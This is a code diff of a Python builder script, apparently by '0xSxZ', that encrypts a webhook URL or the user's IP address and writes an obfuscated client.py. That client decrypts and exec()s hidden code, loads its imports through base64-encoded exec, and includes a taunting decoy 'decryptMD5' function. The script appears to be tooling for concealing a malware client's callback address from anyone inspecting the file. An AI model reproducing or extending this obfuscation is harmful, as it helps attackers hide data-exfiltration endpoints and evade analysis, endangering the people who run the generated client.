@@ -6,22 +6,12 @@ import hashlib
 
 ip = requests.get('https://api.ipify.org').content.decode('utf8')
 
-salt = input("[.] Encoding KEY (default : 0xSxZ^@@@!dazd0xSxZ) : ")
-hashfile = input("[.] Hash the client.py? (don't forget to edit the variables before) (y/n): ")
-if(salt == "" or salt == None):
-	salt = "0xSxZ^@@@!dazd0xSxZ"
+hashfile = "y"
 
-weborHost = input("[.] Encrypt webhook or host? (1/2) : ")
-if(weborHost == "1"):
-	webhook = input("[.] Webhook Url : ")
-else:
-	webhook = input(f"[.] Your IP (is it : {ip} ?) (y/n) : ")
-if webhook == "n":
-	host = input("[.] Enter you IP :")
+salt = "0xSxZ"
 
 def transcrireCle(cle):
 	return "".join([str(ord(elt)) for elt in cle])
-
 
 chiffre = []
 hasher = ""
@@ -67,10 +57,6 @@ def Getchiffrer(cle, msg):
 		except UnicodeEncodeError:
 			crypt += "x"
 	return crypt
-chiffre = chiffrer(salt, webhook)
-print("[.] Encoded : \n" + str(Getchiffrer(salt, webhook)))
-print("\n\n[.] Chiffre : " + str(chiffre))
-
 
 if hashfile == "y":
 	chiffre = []
@@ -83,7 +69,7 @@ def transcrireCle(cle):
 
 def dechiffrer():
 	message = ""
-	cle = transcrireCle(""" + '"' "0xSxZ"+ '"' +""")
+	cle = transcrireCle(""" + '"' + salt + '"' +""")
 	# parcours du tableau chiffre :
 	chiffre = """ + str(chiffre)+"""
 	for i in range(len(chiffre)):
@@ -97,9 +83,11 @@ exec(dechiffrer())
 """).encode()).decode()
 
 
-	fille = str('''import base64\nimport hashlib\nimport sys\nimport time\n
-
-Made_By_0xSxZ = "''' + part2+""""\n\n"""+ """
+	fille = str("""
+import base64
+exec(base64.b64decode("aW1wb3J0IGhhc2hsaWIsIHN5cywgdGltZQ=="))
+Made_By_0xSxZ = """ +'"'
++ part2 + '"'+"""\n\n"""+ """
 def decryptMD5():
 	print("Bahhahah you rly tought")
 
